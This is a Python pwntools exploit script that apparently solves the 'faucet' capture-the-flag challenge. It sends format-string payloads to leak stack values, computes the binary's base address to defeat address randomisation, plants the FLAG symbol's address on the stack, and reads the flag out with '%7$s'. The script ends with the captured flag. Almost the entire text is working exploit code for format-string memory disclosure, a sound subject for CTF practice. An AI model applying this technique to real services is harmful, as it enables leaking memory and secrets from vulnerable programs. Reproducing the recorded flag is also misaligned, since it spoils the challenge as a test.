from pwn import *

context.binary = elf = ELF("faucet")

r = remote("challenge.ctf.games", 32029)
r.recvuntil("a hammer")
# 6
r.sendlineafter(">", b"5")
r.sendline("AAAABBBB %6$p")
r.recvuntil("a ")
print(r.recvuntil("\n", drop = True).decode())

r.sendlineafter(">", b"5")
r.sendline("%21$lx")
r.recvuntil("a ")
ret = int(r.recvuntil("\n", drop = True).decode(), 16)

print(hex(ret))

elf.address = ret - elf.symbols.main
print(hex(elf.address))

padding = b'A' * 8 # to shift the addr down by 1 stack position, cant print flag in one go as there is null byte in the addr, which acts as string terminator
payload = padding + p64(elf.symbols.FLAG)

print(hex(elf.symbols.FLAG))
print(payload)

r.sendlineafter(">", b"5")
r.sendline(payload)

# to access the addressed passed and peek at its content
r.sendlineafter(">", b"5")
r.sendline("%7$s")
r.recvuntil("a ")
print()
print(r.recvuntil("\n", drop = True).decode())
print()

r.close()
    
# flag{6bc75f21f8839ce0db898a1950d11ccf}
